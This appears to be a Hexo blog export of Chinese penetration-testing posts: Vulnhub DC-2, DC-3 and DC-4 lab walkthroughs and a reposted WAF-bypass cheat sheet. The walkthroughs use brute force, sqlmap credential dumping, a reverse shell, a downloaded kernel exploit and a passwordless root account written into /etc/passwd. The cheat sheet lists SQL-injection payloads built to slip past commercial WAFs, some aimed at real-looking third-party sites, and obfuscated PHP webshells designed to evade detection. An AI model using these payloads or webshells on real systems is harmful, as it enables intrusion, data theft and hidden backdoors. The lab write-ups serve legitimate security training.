<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>kali</category>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-4</title>
    <url>/2020/05/13/DC-4/</url>
    <content><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>照理下载<a href="https://www.vulnhub.com/">vulnhub</a>的dc-4项目进行练习</p>
<p>设置的网卡是NAT，其实也可以设置成和物理网络相同的，凭喜好设置</p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">namp -Pn 192.168.114.0/24</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC-4/1.png">

<p>看到了mac地址为虚拟机里的，IP地址为<code>192.168.114.131</code></p>
<p>直接用浏览器访问查看</p>
<img src="https://ckcah.github.io/images/DC-4/2.png">



<p>尝试登陆了一下，不知道是不是我之前有记录的问题，我随便输入passwd都可以进入，但其实burp爆出来的密码是<code>happy</code>，用户名是<code>admin</code>，登录以后的状态其实就是一个命令执行的frame</p>
<p>直接使用firfox自带的查看器，进行代码更改为ifconfig，发现不行</p>
<img src="https://ckcah.github.io/images/DC-4/3.png">



<p>但<code>whoami</code>可以</p>
<img src="https://ckcah.github.io/images/DC-4/4.png">



<p>后知后觉，想起来了burp，对不起！大神，忘了你</p>
<p>然后用burp饶了一下，<code>cat+/etc/passwd</code></p>
<img src="https://ckcah.github.io/images/DC-4/5.png">



<p>仔细看最后几排，会发现，有一些不同于往常linux用户的自建立用户</p>
<p>jim、charles、sam（它好像是linux有的）</p>
<p>继续用burp试了下查看其他目录，发现只有/home目录可以访问，一路下去，就发现了</p>
<img src="https://ckcah.github.io/images/DC-4/6.png">

<img src="https://ckcah.github.io/images/DC-4/9.png">



<p>然后将复制粘贴，将这些密码保存到随便一个txt文件里，命令为passwd.txt，刚刚发现的三个用户，单独用user.txt保存，这样，字典就制作完成。</p>
<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>回顾刚刚的nmap扫描结果，有一个ssh端口，那就请出神器hydra进行爆破</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P passwd.txt 192.168.114.131 ssh</span><br><span class="line"></span><br><span class="line">-L 指定用户名字典</span><br><span class="line">-P 指定密码字典</span><br><span class="line">ssh就是你连接的方式</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC-4/12.png">

<p>用户：jim </p>
<p>密码：jibril04</p>
<p>成功登陆</p>
<img src="https://ckcah.github.io/images/DC-4/13.png">

<p>接下来就多看看有哪些目录和文件可以访问，发现mbox和test.sh都可以看</p>
<img src="https://ckcah.github.io/images/DC-4/14.png">



<p><strong>test.sh</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">for i in &#123;1..5&#125;</span><br><span class="line">do</span><br><span class="line"> sleep 1</span><br><span class="line"> echo &quot;Learn bash they said.&quot;</span><br><span class="line"> sleep 1</span><br><span class="line"> echo &quot;Bash is good they said.&quot;</span><br><span class="line">done</span><br><span class="line"> echo &quot;But I&#x27;d rather bash my head against a brick wall.&quot;</span><br></pre></td></tr></table></figure>

<p><strong>mbox</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">From root@dc-4 Sat Apr 06 20:20:04 2019</span><br><span class="line">Return-path: &lt;root@dc-4&gt;</span><br><span class="line">Envelope-to: jim@dc-4</span><br><span class="line">Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Received: from root by dc-4 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-4&gt;)</span><br><span class="line">        id 1hCiQe-0000gc-EC</span><br><span class="line">        for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">To: jim@dc-4</span><br><span class="line">Subject: Test</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=&quot;UTF-8&quot;</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;</span><br><span class="line">From: root &lt;root@dc-4&gt;</span><br><span class="line">Date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Status: RO</span><br><span class="line"></span><br><span class="line">This is a test.</span><br></pre></td></tr></table></figure>

<p>到这里，就不明白了，然后上网随便搜了一篇<a href="https://blog.csdn.net/weixin_43583637/article/details/101556645">article</a>，作者表示这是一封关于邮件的simple description</p>
<p>所以</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/mail</span><br><span class="line">cat jim</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC-4/19.png">

<p>大概意思就是，他出差，老板叫他给jim他的密码以防万一。</p>
<p>so，ok，拿到密码登就是了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su charless</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC-4/16.png">

<p>成功登陆</p>
<p>试了下，还是不可以看到<code>/root</code>了</p>
<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>那就继续提权，用之前的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC-4/17.png">

<p>teehee命令可以写入文件内容并不覆盖文件原有内容</p>
<p>那就用teehee命令将一个无密码用户raaj写入到/etc/passwd文件，并加入到root组中</p>
<img src="https://ckcah.github.io/images/DC-4/7.png">





<p>这样，就可以直接访问/root了，查看flag.txt</p>
<p>over</p>
<img src="https://ckcah.github.io/images/DC-4/18.png">



<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>kali</category>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>-vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>常见WAF绕过</title>
    <url>/2020/05/13/%E5%B8%B8%E8%A7%81WAF%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p><strong>转载于:<a href="https://www.freebuf.com/column/228763.html">https://www.freebuf.com/column/228763.html</a></strong></p>
<p><strong>PHPIDS</strong></p>
<p>0.6.1.1默认规则 ：</p>
<p>拒绝：/?id=1+union+select+user,password+from+mysql.user+where+user=1</p>
<p>允许：/?id=1+union+select+user,password+from+mysql.user+limit+0,1 </p>
<p>拒绝： /?id=1+OR+1=1</p>
<p>允许： /?id=1+OR+0×50=0×50</p>
<p>拒绝：/?id=substring((1),1,1)</p>
<p>允许： /?id=mid((1),1,1)</p>
<p><strong>Mod_Security</strong></p>
<p>2.5.9默认规则：</p>
<p>拒绝： /?id=1+and+ascii(lower(substring((select+pwd+from+users+limit+1,1),1,1)))=74</p>
<p>允许： /?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74</p>
<p>拒绝： /?id=1+OR+1=1</p>
<p>允许： /?id=1+OR+0×50=0×50</p>
<p>拒绝： /?id=1+and+5=6</p>
<p>允许： /?id=1+and+5!=6</p>
<p>拒绝： /?id=1;drop members</p>
<p>允许：/?id=1;delete members</p>
<p>​     /?id=(1);exec(‘sel’+’ect(1)’+’,(xxx)from’+’yyy’)</p>
<p>Modsecurity WAF Bypass vectors</p>
<p> –new version–</p>
<p>id=@:=(– a %0a select 123 from {ftable})|0.1union– a %0a select+1,@,3</p>
<p>id=@:=(– a %0a select 123 from {ftable})<em>.9union/</em>!%0aselect 1,@,3*/</p>
<p>id=@:=(%23 a %0a select 123 from {ftable})-\Nunion%23 a %0a select+1,@,3</p>
<p>id=@:=(%23 a %0a select 123 from((table)))/1e0union%23 a %0a select+1,@,3</p>
<p>id=@:=(%23 a %0a select 123 from((table)))/1e0union%a0(select 1,@,3)</p>
<p>–old version–</p>
<p>id=1-.0union distinctrow select 1,2,3from {f table}</p>
<p>id=-1 /<em>!50000union</em>/ select 1,2,.3fromtable</p>
<p>id=-1e0union distinct select 1,2,3e0fromtable</p>
<p>id=\Nunion (select 1,2,\Nfrom table)</p>
<p>id=.1union distinct select sql_cache1,2,3 from table</p>
<p><strong>安全狗</strong></p>
<p> /<em>|–|</em>/代替空格</p>
<p>/<em>.</em>.<em>.</em>/ 代替空格。</p>
<p>%1f 绕过空格</p>
<p>/*/#*/ 代替空格。</p>
<p>/<em>/</em>/ 替换空格</p>
<p> <a href="http://www.safedog.cn/?id=/*%E2%80%99unionselect">http://www.safedog.cn/?id=/*’unionselect</a> 1,2 from users%23*/</p>
<p><a href="http://www.safedog.cn/?id=%E2%80%99">http://www.safedog.cn/?id=’</a> — ‘ unionselect 1,2 from users%23</p>
<p><a href="http://www.safedog.cn/?id=%20/*%27%20union%20select%20%27*/%27,2%20from%20users%23">http://www.safedog.cn/?id=%20/*%27%20union%20select%20%27*/%27,2%20from%20users%23</a></p>
<p> /<em>!50001and</em>/</p>
<p>/<em>!50001union</em>/</p>
<p>/<em>!50003select</em>/</p>
<p>/<em>!50001from</em>/  数字不以0结尾</p>
<p>/<em>!union/</em>!*/</p>
<p>/<em>!select/</em>!*/</p>
<p>过狗SHELL</p>
<?php

$id=’xx’;

//if (empty($_POST[$id]) &&empty($_GET[$id])) header(‘HTTP/1.1 404′);

$config =array(‘ynir’=>’type’,'abvgpahs_rgnrep’=>’crfu’);$config =array_flip($config);

$de =function(&$value){$value=strrev(str_rot13($value));};array_walk($config,$de);

@$config['recv'] =isset($_POST[$id])?$_POST[$id]:$_GET[$id];

$fun = function() use ($config){return$config['crfu'](‘$pa’, “{$config['type']}”.’($pa);’);};

$have = $fun();$have($config['recv']);

?>

<?php

$ab = $_REQUEST['d'];

$a['t'] = “”;//主要带对象 D盾就不管后面的了。。。

eval($a['t'].$ab);

 

<?php$_POST['xx']($_POST['oo']);?>

<p>xx=assert&amp;oo=phpinfo()</p>
 <?phpeval(getallheaders()['Accept‐Language'])

 <?php$a=getallheaders()['xxx'];$a(getallheaders()['ooo']);>

 php eval(gzuncompress(base64_decode(getallheaders()['xx'])))

 

**云锁**

 1.php?id=-1 union(select1,2,3,@@datadir,5,6,7,8,9,10,11,12,13,14,15,16,17) （union与select 中间加个“（”）

 2.将空格替换成/*/*/

 3.?id=/*’ union select 1,2 from users%23*/ （把SQL语句写在 /*’  */ 里面）

 

http://www.yunsuo.com.cn/?id=/*’ unionselect ‘*/’,2 from users%23

http://www.yunsuo.com.cn/?id=/*%27%20union%20select%20%27*/%27,2%20from%20users%23

 

**Sucuri**

 最新版sucuri waf绕过

index.php?id=\NUNION(SElecT-1,current_user,3,4,5,6,7,8,9,10,11)—

 

http://www.uaebf.ae/Press-Release.php?id=189%20and%20@x%20:%3dconcat_ws%280×20%2c%30x6279207a6875746f756767,0x3c62723e,0x56657273696f6e203a3a20,@@global%2eversion,0x3c62723e,0x55736572203a3a20,current_user%29%20having%20.0UnIOn–%20-%0aSeLe%43t~1%2c@%78,~3,~4,~5,~6,~7,~8,~9,~10,%30×27–%20-

 

http://www.uaebf.ae/Press-Release.php?id=189-length(user())

http://www.uaebf.ae/Press-Release.php?id=189-casewhen user(+) like’uaebf_DuB6Fuser7@localhost’ then 1 else 2 end

http://www.uaebf.ae/Press-Release.php?id=189-casewhen right(user(+),1) like ‘t’ then 1 else 2 end

 

**WatchGuard**

 watchguard WAF绕过

http://aquatlantis.asia/index.php?id=308&amp;amp;tbl=registoshaving0/*!50000union*//**//**//**//**//**//**//**//**//**//**//**//**//**//**//**//**//*!50000select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,user(),73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160—

 

**Ngx_lua_waf**

 http://192.168.8.147/test/sql.aspx?id=1UNION/*&ID=*/SELECT null,name,null/*&Id=*/FROM master.dbo.sysdatabases

 

**libinjection**

http://test.com/sqli.mysql.php?id=1union select !<1,database() from tables

 

**D****盾**

 http://192.168.8.161/sql.aspx?id=1【Fuzz位置】union selectnull,null,SYSTEM_USER

http://192.168.8.161/sql.aspx?id=1.eunionselect null,null,SYSTEM_USER

 结合IIS获取参数位置顺序：GET,POST,COOKIE<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>WAF</category>
      </categories>
      <tags>
        <tag>WAF</tag>
      </tags>
  </entry>
  <entry>
    <title>DC_3</title>
    <url>/2020/05/13/DC-3/</url>
    <content><![CDATA[<h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><p>本人为初学小白，若文章有什么不对的，请大家多多指教。</p>
<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>使用arp-scan扫描出本网段的主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC-3/1.png">

<p>可以看到靶机IP地址为192.168.3.17</p>
<p>尝试浏览器访问</p>
<img src="https://ckcah.github.io/images/DC-3/2.png">

<p>这段话，大概就是，只有一个flag，需要拿到最高权限root。</p>
<p>试试nmap扫描端口信息什么的吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p- -T5 192.168.3.17</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC-3/3.png">

<p>可以看到管理系统为Joomla CMS，是Ubuntu的操作系统。</p>
<p>好吧，网上有关于专门渗透Joomla的工具，叫<a href="https://github.com/rezasp/joomscan.git">joomscan</a></p>
<img src="https://ckcah.github.io/images/DC-3/4.png">

<p>下载后，进入joomscan文件内，并对靶机进行扫描探测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">perl joomscan.pl -u http://192.168.3.17</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC-3/5.png">

<p>可以看到，扫描该网站的版本是3.7.0，然后，也扫描到了admin的登录目录“administrator”,尝试访问</p>
<img src="https://ckcah.github.io/images/DC-3/6.png">

<p>嗯，很好</p>
<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>在kali里面搜索一下这个版本的漏洞，看看有什么可以用的没</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit Joomla 3.7.0</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC-3/7.png">

<p>只有这个，然后看了一下这个漏洞的说明文档</p>
<p>有很多信息，它的编号，版本号，运行的环境，都有，这里就不做详细介绍了，直接看到箭头所指的方向</p>
<img src="https://ckcah.github.io/images/DC-3/8.png">

<p>用这串代码就没错</p>
<h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>因为个人原因安装了oh-my-zsh，最开始执行这串命令的时候，它提示”list[fullordering]”找不到该命令什么的，我还以为是这个是不是那个参数不对，后来，搜了一下，才知道，是oh-my-zsh的原因，大概就是，命令不完全还是什么，所以这里，只需要在.zshrc最末尾加入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setopt no_nomatch</span><br></pre></td></tr></table></figure>

<p>再重启oh-my-zsh就ok了</p>
<img src="https://ckcah.github.io/images/DC-3/9.png">



<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>ok，回到正题，执行sqlmap命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br><span class="line"></span><br><span class="line">注：localhost应该替换为靶机IP地址</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC-3/10.png">

<p>成功查询到数据库名称</p>
<p>继续用sqlmap爆破出表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.3.17/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC-3/11.png">

<p>(没有截图完全，这是一部分)</p>
<p>我第一眼看到的是这个表</p>
<img src="https://ckcah.github.io/images/DC-3/12.png">

<p>所以就直接查询了这个，比较关心密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.3.17/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &quot;#__users&quot; --columns -p list[fullordering]</span><br></pre></td></tr></table></figure>

<p>查询到了字段名</p>
<img src="https://ckcah.github.io/images/DC-3/13.png">

<p>好，既然到这了，就进行最后一步撒</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.3.17/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &quot;#__users&quot; -C &quot;username,password&quot; --dump -p list[fullordering]</span><br></pre></td></tr></table></figure>

<p>锵锵锵</p>
<img src="https://ckcah.github.io/images/DC-3/14.png">

<p>好，我现在来填之前那个坑，之前我也是遇到hash加密，然后就不知道怎么办了，我这次学到了！</p>
<p>但是，网上说的是！</p>
<p>“这种加密需要用字典来撞，运气好就能得到它的明文”,好吧，那就试试。</p>
<p>kali自带的有个工具叫john，可以尝试。</p>
<p>首先把hash密码放入一个新文件中</p>
<img src="https://ckcah.github.io/images/DC-3/15.png">

<p>使用john破解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john pass</span><br><span class="line">john --show pass</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC-3/16.png">

<p>密码为snoopy</p>
<h3 id="第二个办法"><a href="#第二个办法" class="headerlink" title="第二个办法"></a>第二个办法</h3><p>还有一个办法是暴力破解，但是有猜的成分，我猜测账号为admin，然后使用burp自带的字典进行爆破，确实成功了，这里就不截取了，有点懒。</p>
<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>用这个密码登录后台，看看有没有可以上传脚本的地方</p>
<img src="https://ckcah.github.io/images/DC-3/17.png">

<p>这个是后台的一些项目管理，找了一会，发现了这个</p>
<img src="https://ckcah.github.io/images/DC-3/18.png">

<img src="https://ckcah.github.io/images/DC-3/19.png">

<p>点击进入后的页面是这样</p>
<img src="https://ckcah.github.io/images/DC-3/20.png">

<p>添加文件吧</p>
<p>写个php，可以连接的</p>
<img src="https://ckcah.github.io/images/DC-3/21.png">

<p>这里的IP地址，是反弹的IP地址，也就是你用来监听端口的主机的IP地址（这里是使用的kali），然后，kali监听端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC-3/22.png">

<p>再在网页上浏览刚刚我们加入的test2.php，以达到触发的效果</p>
<img src="https://ckcah.github.io/images/DC-3/23.png">

<p>成功进入靶机中</p>
<img src="https://ckcah.github.io/images/DC-3/24.png">

<p>但这个的权限并不是root，我们需要获得root才能拿到flag</p>
<h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>我习惯性的sudo -l，但是发现，并没有什么用</p>
<img src="https://ckcah.github.io/images/DC-3/25.png">

<img src="https://ckcah.github.io/images/DC-3/26.png">

<p>所以干脆就查了一下靶机的信息，回kali搜一下相关漏洞</p>
<img src="https://ckcah.github.io/images/DC-3/27.png">

<p>就是它了</p>
<p>看一下说明文档</p>
<img src="https://ckcah.github.io/images/DC-3/28.png">

<p>先下载吧。</p>
<h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br><span class="line">unzip 39772.zip</span><br><span class="line">cd 39772</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC-3/29.png">

<p>将这个文件上传到靶机中去</p>
<p>这里使用的方法是利用python开启下载服务端，然后再在靶机中进行下载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 5555</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC-3/30.png">

<p>可以看到服务端口正在运行，切换至靶机中</p>
<img src="https://ckcah.github.io/images/DC-3/31.png">

<p>成功下载，好，现在可以解压进行利用了</p>
<img src="https://ckcah.github.io/images/DC-3/32.png">

<p>多出一个doubleput文件</p>
<p>执行</p>
<img src="https://ckcah.github.io/images/DC-3/33.png">

<p>成功获得flag</p>
<img src="https://ckcah.github.io/images/DC-3/34.png"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>kali</category>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>vulnhub</tag>
        <tag>Joomla</tag>
      </tags>
  </entry>
  <entry>
    <title>DC_2</title>
    <url>/2020/05/13/DC-2/</url>
    <content><![CDATA[<h1 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h1><p>信息安全初学者一枚，正在努力提升中。。。。</p>
<p>今天渗透的实验靶场，是Vulnhub的DC-2，和之前的DC-1是同系列的。</p>
<h1 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h1><p>成功安装virtual Box，只需要下载vlunhub的DC-2项目，导入virtual中即可使用，不需要登录什么的。</p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>老样子，打开你的kali，直接nmap，使用参数-Pn扫描网段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -Pn 192.168.3.0/24</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC_2/1.png">

<p>继续扫描主机的详细信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p- -T4 192.168.3.13</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC_2/2.png">

<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>既然开启了80端口，那就直接浏览器访问吧</p>
<img src="https://ckcah.github.io/images/DC_2/3.png">

<p>然后发现，这是将IP地址重定向了，那就，直接在/etc/hosts里进行设置吧（请注意，在windows下边，hosts文件在C:\Windows\System32\drivers\etc中）</p>
<img src="https://ckcah.github.io/images/DC_2/4.png">



<p>修改完成后，再一次在浏览器中进行浏览，成功打开界面</p>
<img src="https://ckcah.github.io/images/DC_2/5.png">

<h2 id="0x03-flag1"><a href="#0x03-flag1" class="headerlink" title="0x03 flag1"></a>0x03 flag1</h2><p>可以看到flag就在眼前</p>
<img src="https://ckcah.github.io/images/DC_2/6.png">

<p>用dirb扫描一下目录吧，看看有没有有用的东西</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://dc-2/</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC_2/7.png">

<p>这个好像是他的后台，先不管。</p>
<h2 id="0x04-flag2"><a href="#0x04-flag2" class="headerlink" title="0x04 flag2"></a>0x04 flag2</h2><p>之前找到的flag1的提示大概是：常用的密码可能无法使用，所以需要用到<em><strong>cewl</strong></em>这个工具。</p>
<p>好的，了解了。</p>
<p>kali中有一款专门针对wordpress的渗透工具，叫做wpscan，现在请出这个神器，对网站进行用户探测。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -e u</span><br><span class="line">-e:枚举幸喜</span><br><span class="line">u： 枚举用户名，默认从1-10</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC_2/8.png">

<p>成功枚举出用户admin、jerry、tom。</p>
<h3 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h3><p>wpscan这个工具，怎么说，好用是好用，就是kali里，它好像，无法更新数据库？当时遇到这个问题的时候，在经过半个小时的查询后，我终于找到了办法。请参考<a href="https://blog.csdn.net/zhang644720213/article/details/92849717">wpscan数据库无法更新</a></p>
<p>ok，既然知道了用户有哪些，就直接用cewl根据这个网站，生成一个密码字典吧。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cewl http://dc-2/ -w 1</span><br><span class="line">-w 后边接文件名：表示将结果写入文件中</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC_2/9.png">



<p>然后我们将上边枚举出的3个用户写入另一个空白文件中</p>
<img src="https://ckcah.github.io/images/DC_2/10.png">

<p>接下来，直接用wpscan，去匹配文件密码就好了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -U 2 -P 1</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC_2/11.png">

<p>成功爆破出jerry和tom的用户密码：adipiscing和parturient</p>
<p>之前dirb扫描出的后台目录派上了用场，直接用账号密码登录，成功找到flag2</p>
<img src="https://ckcah.github.io/images/DC_2/12.png">



<h2 id="0x05-flag3"><a href="#0x05-flag3" class="headerlink" title="0x05 flag3"></a>0x05 flag3</h2><p>最开始nmap扫描的时候，就已经看到了，存在ssh端口7744，然后尝试用得到的账号密码登录。发现jerry不可登录，但是tom可以</p>
<img src="https://ckcah.github.io/images/DC_2/13.png">

<p>成功进入</p>
<p>尝试执行一些命令，发现，它对用户做了限制</p>
<img src="https://ckcah.github.io/images/DC_2/14.png">

<p>尝试了一下用vi打开，生效了？但是，网上有些文章说的是，需要进行一些操作才能看到，emm，不知道为什么可以看，所以不能演示绕过操作。</p>
<img src="https://ckcah.github.io/images/DC_2/15.png">



<h2 id="0x06-flag4"><a href="#0x06-flag4" class="headerlink" title="0x06 flag4"></a>0x06 flag4</h2><p>flag3的提示大概是说，emmm，反正就是和jerry有关</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su jerry</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC_2/16.png">

<p>出错了，没权限。那，应该是和上边那个权限转化有关了</p>
<p>所以，就 直接vi 来转义一下受限制的 shell吧。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi</span><br><span class="line">:set shell=/bin/bash</span><br><span class="line">:shell</span><br><span class="line">export PATH=/bin:/usr/bin:$PATH</span><br><span class="line">export SHELL=/bin/bash:$SHELL</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC_2/17.png">

<p>成功转化</p>
<img src="https://ckcah.github.io/images/DC_2/18.png">

<p>找找flag4在哪</p>
<img src="https://ckcah.github.io/images/DC_2/19.png">

<h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><p>提示说：现在我是独自战斗了，不是很开心。。。</p>
<p>按照dc-1的套路，尝试查看可以sudo的用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC_2/20.png">

